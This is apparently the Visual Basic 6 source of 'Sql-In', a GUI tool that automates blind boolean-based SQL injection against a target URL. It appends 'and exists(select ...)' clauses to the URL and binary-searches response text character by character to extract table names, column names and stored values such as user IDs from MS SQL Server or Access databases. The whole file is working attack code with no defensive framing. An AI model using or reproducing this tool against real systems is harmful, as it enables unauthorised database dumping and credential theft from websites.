VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frm 
   Caption         =   "Sql-In"
   ClientHeight    =   6810
   ClientLeft      =   4140
   ClientTop       =   3795
   ClientWidth     =   7665
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   6810
   ScaleWidth      =   7665
   Begin MSComDlg.CommonDialog cdlg 
      Left            =   4590
      Top             =   3480
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComctlLib.StatusBar statbar 
      Align           =   2  'Align Bottom
      Height          =   315
      Left            =   0
      TabIndex        =   23
      Top             =   6495
      Width           =   7665
      _ExtentX        =   13520
      _ExtentY        =   556
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   1
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            AutoSize        =   1
            Object.Width           =   13018
         EndProperty
      EndProperty
   End
   Begin VB.Frame fraResult 
      Caption         =   "Results"
      Height          =   2625
      Left            =   60
      TabIndex        =   14
      Top             =   3810
      Width           =   7575
      Begin VB.CommandButton cmdRecCount 
         Caption         =   "&Count"
         Height          =   255
         Left            =   1530
         TabIndex        =   44
         Top             =   1080
         Width           =   675
      End
      Begin VB.CheckBox chkNumeric 
         Caption         =   "Num"
         Height          =   195
         Left            =   6690
         TabIndex        =   43
         Top             =   240
         Width           =   675
      End
      Begin VB.CommandButton cmdGetPair 
         Caption         =   "G&et Pair"
         Height          =   435
         Left            =   6690
         TabIndex        =   42
         Top             =   1020
         Width           =   675
      End
      Begin VB.TextBox txtV 
         Height          =   270
         Left            =   5250
         TabIndex        =   39
         Top             =   2280
         Width           =   1485
      End
      Begin VB.TextBox txtC 
         Height          =   270
         Left            =   2730
         TabIndex        =   38
         Text            =   "userid"
         Top             =   2250
         Width           =   1485
      End
      Begin VB.TextBox txtT 
         Height          =   270
         Left            =   90
         TabIndex        =   37
         Text            =   "users"
         Top             =   2250
         Width           =   1485
      End
      Begin VB.ListBox lstValues 
         Height          =   1680
         Left            =   5340
         TabIndex        =   35
         Top             =   540
         Width           =   1275
      End
      Begin VB.CommandButton cmdLoadVal 
         Caption         =   "&Load"
         Height          =   255
         Left            =   6690
         TabIndex        =   34
         Top             =   1980
         Width           =   675
      End
      Begin VB.CommandButton cmdSaveVal 
         Caption         =   "&Save"
         Height          =   255
         Left            =   6690
         TabIndex        =   33
         Top             =   1710
         Width           =   675
      End
      Begin VB.CommandButton cmdGetValues 
         Caption         =   "G&et"
         Height          =   255
         Left            =   6690
         TabIndex        =   32
         Top             =   540
         Width           =   675
      End
      Begin VB.CommandButton cmdGetColumns 
         Caption         =   "G&et"
         Height          =   255
         Left            =   4170
         TabIndex        =   30
         Top             =   510
         Width           =   675
      End
      Begin VB.CommandButton cmdSaveCol 
         Caption         =   "&Save"
         Height          =   255
         Left            =   4170
         TabIndex        =   29
         Top             =   1680
         Width           =   675
      End
      Begin VB.CommandButton cmdLoadCol 
         Caption         =   "&Load"
         Height          =   255
         Left            =   4170
         TabIndex        =   28
         Top             =   1950
         Width           =   675
      End
      Begin VB.CommandButton cmdLoad 
         Caption         =   "&Load"
         Height          =   255
         Left            =   1530
         TabIndex        =   27
         Top             =   1920
         Width           =   675
      End
      Begin VB.CommandButton cmdSave 
         Caption         =   "&Save"
         Height          =   255
         Left            =   1530
         TabIndex        =   26
         Top             =   1650
         Width           =   675
      End
      Begin VB.ListBox lstColumns 
         Height          =   1680
         Left            =   2820
         TabIndex        =   21
         Top             =   510
         Width           =   1275
      End
      Begin VB.ListBox lstTables 
         Height          =   1680
         ItemData        =   "main.frx":0000
         Left            =   180
         List            =   "main.frx":0002
         TabIndex        =   19
         Top             =   510
         Width           =   1275
      End
      Begin VB.CommandButton cmdGetTable 
         Caption         =   "&Get"
         Height          =   255
         Left            =   1530
         TabIndex        =   18
         Top             =   510
         Width           =   675
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Values:"
         Height          =   180
         Index           =   9
         Left            =   5430
         TabIndex        =   36
         Top             =   330
         Width           =   630
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Columns:"
         Height          =   180
         Index           =   7
         Left            =   2820
         TabIndex        =   22
         Top             =   300
         Width           =   720
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Tables:"
         Height          =   180
         Index           =   6
         Left            =   180
         TabIndex        =   20
         Top             =   300
         Width           =   630
      End
   End
   Begin VB.Frame Frame1 
      Height          =   30
      Left            =   90
      TabIndex        =   13
      Top             =   3660
      Width           =   7515
   End
   Begin VB.Frame fra 
      BorderStyle     =   0  'None
      Height          =   3435
      Left            =   60
      TabIndex        =   0
      Top             =   30
      Width           =   7635
      Begin VB.TextBox txtFunc 
         Height          =   285
         Index           =   2
         Left            =   1740
         TabIndex        =   53
         Text            =   "mid"
         Top             =   3060
         Width           =   705
      End
      Begin VB.TextBox txtFunc 
         Height          =   285
         Index           =   1
         Left            =   960
         TabIndex        =   52
         Text            =   "asc"
         Top             =   3060
         Width           =   705
      End
      Begin VB.TextBox txtFunc 
         Height          =   285
         Index           =   0
         Left            =   180
         TabIndex        =   51
         Text            =   "len"
         Top             =   3060
         Width           =   705
      End
      Begin VB.CheckBox chkAllowed 
         Caption         =   "' Allowed"
         Height          =   285
         Left            =   1050
         TabIndex        =   50
         Top             =   2730
         Width           =   1605
      End
      Begin VB.OptionButton optElse 
         Caption         =   "Other"
         Height          =   255
         Left            =   2100
         TabIndex        =   11
         Top             =   2490
         Value           =   -1  'True
         Width           =   975
      End
      Begin VB.TextBox txtRangeE 
         Height          =   285
         Left            =   4200
         TabIndex        =   47
         Text            =   "65535"
         Top             =   2948
         Width           =   675
      End
      Begin VB.TextBox txtRangeB 
         Height          =   285
         Left            =   3420
         TabIndex        =   46
         Text            =   "0"
         Top             =   2948
         Width           =   675
      End
      Begin VB.TextBox txtStartLength 
         Height          =   270
         Left            =   4290
         TabIndex        =   45
         Text            =   "1"
         Top             =   2520
         Width           =   585
      End
      Begin VB.TextBox txtAddSql 
         Height          =   270
         Left            =   1050
         TabIndex        =   40
         Top             =   2100
         Width           =   6525
      End
      Begin VB.CommandButton cmdStop 
         Caption         =   "&Stop"
         Height          =   375
         Left            =   4950
         TabIndex        =   31
         Top             =   2460
         Width           =   1215
      End
      Begin VB.TextBox txtRet 
         Height          =   495
         Left            =   1050
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   24
         Top             =   1500
         Width           =   6525
      End
      Begin VB.CommandButton cmdTestAll 
         Caption         =   "&Auto"
         Height          =   375
         Left            =   6270
         TabIndex        =   17
         Top             =   2970
         Width           =   1215
      End
      Begin VB.TextBox txtTable 
         Height          =   270
         Left            =   6240
         TabIndex        =   15
         Top             =   3510
         Visible         =   0   'False
         Width           =   1485
      End
      Begin VB.OptionButton optAccess 
         Caption         =   "Access"
         Height          =   255
         Left            =   1050
         TabIndex        =   10
         Top             =   2490
         Width           =   1215
      End
      Begin VB.TextBox txtFailTxt 
         Height          =   270
         Left            =   1050
         TabIndex        =   9
         Text            =   "找不到该影片"
         Top             =   1125
         Width           =   6525
      End
      Begin VB.TextBox txtSuccTxt 
         Height          =   270
         Left            =   1050
         TabIndex        =   8
         Text            =   "指环王"
         Top             =   750
         Width           =   6525
      End
      Begin VB.CommandButton cmdTestOne 
         Caption         =   "&Manual"
         Height          =   375
         Left            =   6270
         TabIndex        =   5
         Top             =   2460
         Width           =   1215
      End
      Begin VB.TextBox txtSta 
         Height          =   270
         Left            =   1050
         TabIndex        =   3
         Top             =   375
         Width           =   6525
      End
      Begin VB.TextBox txtURL 
         Height          =   270
         Left            =   1050
         TabIndex        =   2
         Text            =   "http://www.xxx.com/view.asp?id=123"
         Top             =   0
         Width           =   6525
      End
      Begin VB.CheckBox chkTop1 
         Caption         =   "Top 1"
         Height          =   225
         Left            =   180
         TabIndex        =   54
         Top             =   2760
         Width           =   915
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Range:"
         Height          =   180
         Index           =   12
         Left            =   2850
         TabIndex        =   49
         Top             =   3015
         Width           =   540
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Start Len.:"
         Height          =   180
         Index           =   11
         Left            =   3300
         TabIndex        =   48
         Top             =   2550
         Width           =   990
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Addt. Sql:"
         Height          =   180
         Index           =   10
         Left            =   120
         TabIndex        =   41
         Top             =   2130
         Width           =   900
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Ret Text:"
         Height          =   180
         Index           =   8
         Left            =   210
         TabIndex        =   25
         Top             =   1500
         Width           =   810
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Table Name:"
         Height          =   180
         Index           =   5
         Left            =   5190
         TabIndex        =   16
         Top             =   3540
         Visible         =   0   'False
         Width           =   990
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SQL Type:"
         Height          =   180
         Index           =   4
         Left            =   180
         TabIndex        =   12
         Top             =   2490
         Width           =   810
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Fail Text:"
         Height          =   180
         Index           =   3
         Left            =   120
         TabIndex        =   7
         Top             =   1170
         Width           =   900
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Succ. Text:"
         Height          =   180
         Index           =   2
         Left            =   30
         TabIndex        =   6
         Top             =   780
         Width           =   990
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SQL Sta.:"
         Height          =   180
         Index           =   1
         Left            =   210
         TabIndex        =   4
         Top             =   420
         Width           =   810
      End
      Begin VB.Label lbl 
         Alignment       =   1  'Right Justify
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SQL-In URL:"
         Height          =   180
         Index           =   0
         Left            =   30
         TabIndex        =   1
         Top             =   30
         Width           =   990
      End
   End
   Begin InetCtlsObjects.Inet inet 
      Left            =   3120
      Top             =   3240
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
End
Attribute VB_Name = "frm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim m_fReturned As Boolean
Dim m_GetStatus As Long

Private Sub cmdGetColumns_Click()
    If txtTable.Text = "" And txtT.Text = "" Then Exit Sub
    m_GetStatus = 2
    GetColumns
End Sub

Private Sub cmdGetPair_Click()
    Dim s As String
    s = InputBox("the first column is " & txtC.Text & ".what's the other one?")
    If s <> "" Then
        txtAddSql.Text = StrToCHAR(txtC.Text, txtV.Text)
        txtC.Text = s
    End If
End Sub

Private Sub cmdGetTable_Click()
    m_GetStatus = 1
    GetTables
End Sub

Private Sub cmdGetValues_Click()
    If txtC.Text = "" Or txtT.Text = "" Then Exit Sub
    
    m_GetStatus = 3
    GetValues
End Sub

Private Sub cmdLoad_Click()
    Dim l As Long, s As String
    Dim v As Variant, sbuf As String
    l = FreeFile
    s = GetLoad
    If s <> "" Then
        sbuf = String(FileLen(s), Chr(0))
        Open s For Binary As #l
        Get #l, , sbuf
        Close #l
        v = Split(sbuf, vbCrLf)
        For i = 0 To UBound(v)
            lstTables.AddItem v(i)
        Next
    End If
End Sub

Private Sub cmdLoadCol_Click()
    Dim l As Long, s As String
    Dim v As Variant, sbuf As String
    l = FreeFile
    s = GetLoad
    If s <> "" Then
        sbuf = String(FileLen(s), Chr(0))
        Open s For Binary As #l
        Get #l, , sbuf
        Close #l
        v = Split(sbuf, vbCrLf)
        For i = 0 To UBound(v)
            lstColumns.AddItem v(i)
        Next
    End If
End Sub

Private Sub cmdLoadVal_Click()
    Dim l As Long, s As String
    Dim v As Variant, sbuf As String
    l = FreeFile
    s = GetLoad
    If s <> "" Then
        sbuf = String(FileLen(s), Chr(0))
        Open s For Binary As #l
        Get #l, , sbuf
        Close #l
        v = Split(sbuf, vbCrLf)
        For i = 0 To UBound(v)
            lstValues.AddItem v(i)
        Next
    End If
End Sub

Private Sub cmdSave_Click()
    Dim l As Long, s As String
    l = FreeFile
    s = GetSave
    If s <> "" Then
        Open s For Binary As #l
        For i = 0 To lstTables.ListCount - 1
            Put #l, , lstTables.List(i)
            Put #l, , vbCrLf
        Next
        Close #l
    End If
End Sub




Private Sub cmdSaveCol_Click()
    Dim l As Long, s As String
    l = FreeFile
    s = GetSave
    If s <> "" Then
        Open s For Binary As #l
        For i = 0 To lstColumns.ListCount - 1
            Put #l, , lstColumns.List(i)
            Put #l, , vbCrLf
        Next
        Close #l
    End If
End Sub

Private Sub cmdSaveVal_Click()
    Dim l As Long, s As String
    l = FreeFile
    s = GetSave
    If s <> "" Then
        Open s For Binary As #l
        For i = 0 To lstValues.ListCount - 1
            Put #l, , lstValues.List(i)
            Put #l, , vbCrLf
        Next
        Close #l
    End If
End Sub

Private Sub cmdStop_Click()
    m_fReturned = True
    inet.Cancel
End Sub

Private Sub cmdTestAll_Click()
    Dim i As Long
    Dim l As Long, s As String
    
    Call cmdGetTable_Click
    
    For i = 0 To lstTables.ListCount - 1
        lstTables.ListIndex = i
        Call cmdGetColumns_Click
    Next
    
    l = FreeFile
    s = "e:\columns"
    If s <> "" Then
        Open s For Binary As #l
        For i = 0 To lstColumns.ListCount - 1
            Put #l, , lstColumns.List(i)
            Put #l, , vbCrLf
        Next
        Close #l
    End If
    
    MsgBox "done!"
End Sub

Private Sub cmdTestOne_Click()
    m_fReturned = False
    txtRet.Text = ""
    If ManualTest(txtSta.Text) = STAT_SUCCESS Then
        TipText "ok."
    Else
        TipText "failed."
    End If
End Sub



Private Sub Form_Load()
    txtSta.Text = txtURL.Text
    Call optAccess_Click
End Sub

Private Sub Form_Unload(Cancel As Integer)
    m_fReturned = True
    inet.Cancel
    End
End Sub
Public Function AccessFilter(sSql As String) As String
    AccessFilter = sSql
    If optAccess.Value = True Then
        AccessFilter = Replace(AccessFilter, "len(", txtFunc(0).Text & "(")
        AccessFilter = Replace(AccessFilter, "unicode(", txtFunc(1).Text & "(")
        AccessFilter = Replace(AccessFilter, "substring(", txtFunc(2).Text & "(")
    End If
End Function
Public Function ManualTest(sSql As String) As Long
    Dim s As String

    With inet
        .AccessType = icDirect
        If .StillExecuting = False Then
            s = .OpenURL(AccessFilter(sSql))
            WaitReturn
        End If
        txtRet.Text = s
    End With
    
    ManualTest = STAT_UNKOWN
    If InStr(s, txtSuccTxt.Text) <> 0 Then
        ManualTest = STAT_SUCCESS
    Else
        If InStr(s, txtFailTxt.Text) <> 0 Then
            ManualTest = STAT_FAIL
        End If
    End If
End Function

Public Function GetValues() As Long
    Dim sTablename As String
    Dim sStat As String
    Dim lLength As Long
    Dim sCol As String, sTable As String
    sCol = txtC.Text
    sTable = txtT.Text
    If sTable = "" Or sCol = "" Then Exit Function
    
    lstValues.AddItem sTable & ":"
    lstValues.AddItem sCol & "->"
    
    If optAccess.Value = True Then
    Else
    End If
    
    sStat = "select " & sCol & " from " & sTable
    
    lLength = CLng(txtStartLength.Text)
    Do
        TipText "tesing length of " & Str(lLength) & "..."
        If TestLength(sCol, sStat, lLength) Then
             Call GuessIt(sCol, sStat, lLength)
        End If
        TipText "tesing length of " & Str(lLength) & "...done."
        
        lLength = lLength + 1
    Loop Until lLength > MAX_TABLENAME_LENGTH Or m_fReturned = True
    m_fReturned = False
End Function

'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************



Public Function GetColumns() As Long
    Dim sTablename As String
    Dim sStat As String
    Dim lLength As Long
    Dim sCol As String
    If txtTable.Text <> "" Then
        lstColumns.AddItem txtTable.Text & ":"
    Else
        lstColumns.AddItem txtT.Text & ":"
    End If
    
    sCol = "a.name"
    If optAccess.Value = True Then
        sTablename = "MSysObjects"
    Else
        sStat = "select * from syscolumns a left join sysobjects b on a.id=b.id where " & StrToCHAR("b.name", txtTable.Text)
    End If
    
    lLength = CLng(txtStartLength.Text)
    Do
        TipText "tesing length of " & Str(lLength) & "..."
        If TestLength(sCol, sStat, lLength) Then
             Call GuessIt(sCol, sStat, lLength)
        End If
        TipText "tesing length of " & Str(lLength) & "...done."
        
        lLength = lLength + 1
    Loop Until lLength > MAX_TABLENAME_LENGTH Or m_fReturned = True
    m_fReturned = False
End Function


'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************
'************************* Get Columns ****************************** ******************************
















'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
Public Function TestOne(sSql As String) As Long
    Dim s As String
    txtSta.Text = FinalURL(sSql & AddSql)
    If m_fReturned = True Then Exit Function
    With inet
        .AccessType = icDirect
        WaitReturn
        s = .OpenURL(AccessFilter(txtSta.Text))
        WaitReturn
    End With
    
    TestOne = STAT_UNKOWN
    If InStr(s, txtSuccTxt.Text) <> 0 Then
        TestOne = STAT_SUCCESS
    Else
        If InStr(s, txtFailTxt.Text) <> 0 Then
            TestOne = STAT_FAIL
        End If
    End If
End Function

Public Function GetTables() As Long
    Dim sTablename As String
    Dim sStat As String
    Dim lLength As Long
    Dim sCol As String
    
    If optAccess.Value = True Then
        sTablename = "MSysObjects"
    Else
        sTablename = "sysobjects"
    End If
    sCol = "name"
    sStat = "select " & sCol & " from " & sTablename & " where "
    lLength = CLng(txtStartLength.Text)
    Do
        TipText "tesing length of " & Str(lLength) & "..."
        If TestLength(sCol, sStat, lLength) Then
             Call GuessIt(sCol, sStat, lLength)
        End If
        TipText "tesing length of " & Str(lLength) & "...done."
        
        lLength = lLength + 1
    Loop Until lLength > MAX_TABLENAME_LENGTH Or m_fReturned = True
    m_fReturned = False
End Function
Function AddSql() As String
    Dim sAdd As String
    sAdd = txtAddSql.Text
    If sAdd <> "" Then
        If LCase(Left(Trim(sAdd), 5)) <> "order" Then
            sAdd = " and " & sAdd & " "
        Else
            sAdd = " " & sAdd
        End If
    End If
    AddSql = sAdd
End Function
Function ReGuessOne(sCol As String, sSql As String, lNow As Long, lMax As Long, sRet As String) As String
    On Error Resume Next
    Dim lCrnt As Long, lInit As Long, lBase As Long
    Dim i As Long
    Dim s As String, s1 As String
    lInit = 65536
    lBase = 0
    i = lNow
    If optAccess.Value = True Then
        lInit = Asc("z") '65535
        lBase = Asc("0") ' -65535
    End If
    lCrnt = Abs(lInit) + Abs(lBase)
    
    lBase = CLng(txtRangeB.Text)
    lInit = CLng(txtRangeE.Text)
    
    lCrnt = lInit - lBase
    
    s = sSql
    If i > 0 Then
        Do
            lCrnt = lCrnt \ 2
            If optAccess.Value = True Then
                TipText "finding..." & lCrnt & " (found:" & sRet & ":" & CStr(lNow) & ")"
            Else
                TipText "finding..." & lCrnt & " (found:" & sRet & ")"
            End If
            's1 = s & " and unicode(substring(" & sCol & "," & Str(i) & ",1))>=" & lBase & " " & " and unicode(substring(" & sCol & "," & Str(i) & ",1))<=" & Str(lCrnt + lBase)
            s1 = Replace(s, "where", " where unicode(substring(" & sCol & "," & Str(i) & ",1))>=" & lBase & " " & " and unicode(substring(" & sCol & "," & Str(i) & ",1))<=" & Str(lCrnt + lBase) & " and ")
            If TestOne(s1) = STAT_SUCCESS Then
                If lBase = lCrnt + lBase Then
                    If optAccess.Value = True Then
                        sRet = sRet & Chr(lBase)
                    Else
                        sRet = sRet & UCS2ToASC(lBase)
                    End If
                    Exit Do
                End If
            Else
                lBase = lBase + lCrnt + 1
                's1 = s & " and unicode(substring(" & sCol & "," & Str(i) & ",1))>=" & lBase & " " & " and unicode(substring(" & sCol & "," & Str(i) & ",1))<=" & Str(lCrnt + lBase)
                s1 = Replace(s, "where", " where unicode(substring(" & sCol & "," & Str(i) & ",1))>=" & lBase & " " & " and unicode(substring(" & sCol & "," & Str(i) & ",1))<=" & Str(lCrnt + lBase) & " and ")
                If TestOne(s1) = STAT_SUCCESS Then
                    If lBase = lCrnt + lBase Then
                        If optAccess.Value = True Then
                            sRet = sRet & Chr(lBase)
                        Else
                            sRet = sRet & UCS2ToASC(lBase)
                        End If
                        Exit Do
                    End If
                End If
            End If
        Loop Until m_fReturned = True Or lCrnt = 0
    End If
    
    If i >= lMax Then
        If sRet <> "" Then
            Dim sOut As String
            sOut = sRet
'            If optAccess.Value = False Then
'                sOut = StrConv(sRet, vbUnicode)
'            End If
            Select Case m_GetStatus
            Case 1
                lstTables.AddItem sOut
            Case 2
                lstColumns.AddItem sOut
            Case 3
                lstValues.AddItem sOut
            End Select
        End If
            
        ReGuessOne = sSql
        Exit Function
    Else
        i = i + 1
        
        s1 = sSql
        
        If sRet <> "" Then
            If optAccess.Value = True Then
                If chkAllowed.Value = vbChecked Then
                    s1 = "select " & sCol & " from " & txtT.Text & " where len(" & sCol & ")= " & CStr(lMax) & " and left(" & sCol & "," & Str(i - 1) & ")='" & Left(sRet, i - 1) & "'"
                Else
                    s1 = s1 & " and unicode(substring(" & sCol & "," & Str(i - 1) & ",1))=" & Asc(Mid(sRet, i - 1, 1))
                End If
            Else
                s1 = s1 & " and unicode(substring(" & sCol & "," & Str(i - 1) & ",1))=" & ASCToUCS2(Mid(sRet, i - 1, 1))
            End If
        End If
        
        Do While m_fReturned = False
            s1 = ReGuessOne(sCol, s1, i, lMax, sRet)
            
            
            If sRet <> "" Then
                If optAccess.Value = True Then
                    If chkAllowed.Value = vbChecked Then
                        s1 = "select " & sCol & " from " & txtT.Text & " where len(" & sCol & ")= " & CStr(lMax) & " and left(" & sCol & "," & Str(i) & ")='" & Left(sRet, i) & "'"
                    Else
                        s1 = s1 & " and unicode(substring(" & sCol & "," & Str(i) & ",1))<>" & Asc(Mid(sRet, i, 1))
                    End If
                Else
                    s1 = s1 & " and unicode(substring(" & sCol & "," & Str(i) & ",1))<>" & ASCToUCS2(Mid(sRet, i, 1))
                End If
            End If
            
            
            If TestOne(s1) = STAT_SUCCESS Then
                If optAccess.Value = True Then
                    sRet = Left(sRet, i - 1)
                Else
                    sRet = Left(sRet, i - 1)
                End If
            Else
                ReGuessOne = sSql
                Exit Do
            End If
        Loop
    End If
    
End Function

Function ReGuessOneNum(sCol As String, sSql As String, lNow As Long, lMax As Long, sRet As String) As String
'get data length
'decide precsion
'guess
    
End Function

Function GuessIt(sCol As String, sSql As String, lLen As Long) As String
    Dim lCrnt As Long, lInit As Long, lBase As Long
    Dim i As Long
    Dim s As String, s1 As String
    Dim sRet As String
    lInit = 255
    If optAccess.Value = True Then
        sRet = ""
        Select Case m_GetStatus
        Case 1
            s = sSql & " unicode(xtype)=85 and len(" & sCol & ")=" & Str(lLen)
        Case 2
            s = sSql & " and len(" & sCol & ")=" & Str(lLen)
        Case 3
            s = sSql & " where len(" & sCol & ")=" & Str(lLen)
        End Select
        ReGuessOne sCol, s, 0, lLen, sRet
    Else
        sRet = ""
        Select Case m_GetStatus
        Case 1
            s = sSql & " unicode(xtype)=85 and len(" & sCol & ")=" & Str(lLen)
        Case 2
            s = sSql & " and len(" & sCol & ")=" & Str(lLen)
        Case 3
            s = sSql & " where len(" & sCol & ")=" & Str(lLen)
        End Select
        ReGuessOne sCol, s, 0, lLen, sRet
    End If
    GuessIt = sRet
End Function

Function TestLength(sCol As String, sSql As String, lLen As Long) As Boolean
    Dim s As String
    If optAccess.Value = True Then
        Select Case m_GetStatus
        Case 1
            s = sSql & " unicode(xtype)=85 and len(" & sCol & ")=" & Str(lLen)
        Case 2
            s = sSql & " and len(" & sCol & ")=" & Str(lLen)
        Case 3
            s = sSql & " where len(" & sCol & ")=" & Str(lLen)
        End Select
    Else
        Select Case m_GetStatus
        Case 1
            s = sSql & " unicode(xtype)=85 and len(" & sCol & ")=" & Str(lLen)
        Case 2
            s = sSql & " and len(" & sCol & ")=" & Str(lLen)
        Case 3
            s = sSql & " where len(" & sCol & ")=" & Str(lLen)
        End Select
    End If
    TestLength = False
    Select Case TestOne(s)
    Case STAT_UNKOWN
        
    Case STAT_SUCCESS
        TestLength = True
        txtRet.Text = txtRet.Text & Str(lLen)
    Case STAT_FAIL
    End Select
End Function

Function WaitReturn() As Boolean
    Do While inet.StillExecuting
        DoEvents
    Loop
End Function

Function FinalURL(sSql As String) As String
    FinalURL = txtURL & " and exists(" & sSql & " )"
    
    If chkTop1.Value = vbChecked Then
        FinalURL = Replace(FinalURL, "select ", "select top 1 ")
    End If
    
End Function

'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************
'************************* ************************* Get Tables ******************************















Function TipText(s As String) As Boolean
    statbar.Panels(1).Text = s
End Function

Function GetSave() As String
    On Error Resume Next
    With cdlg
        .CancelError = True
        .ShowSave
        If Err.Number <> 0 Then
            GetSave = ""
        Else
            GetSave = .FileName
        End If
    End With
End Function


Function GetLoad() As String
    On Error Resume Next
    With cdlg
        .CancelError = True
        .ShowOpen
        If Err.Number <> 0 Then
            GetLoad = ""
        Else
            GetLoad = .FileName
        End If
    End With
End Function

Private Sub lstColumns_Click()
    txtC.Text = lstColumns.Text
End Sub

Private Sub lstTables_Click()
    txtTable.Text = lstTables.Text
    txtT.Text = lstTables.Text
End Sub

Private Sub lstValues_Click()
    txtV.Text = lstValues.Text
End Sub

Private Sub optAccess_Click()
    txtRangeB.Text = "-32767"
    txtRangeE.Text = "32767"
End Sub

Private Sub optElse_Click()
    txtRangeB.Text = "0"
    txtRangeE.Text = "65536"
End Sub

Private Sub txtT_Change()
    txtTable.Text = txtT.Text
End Sub
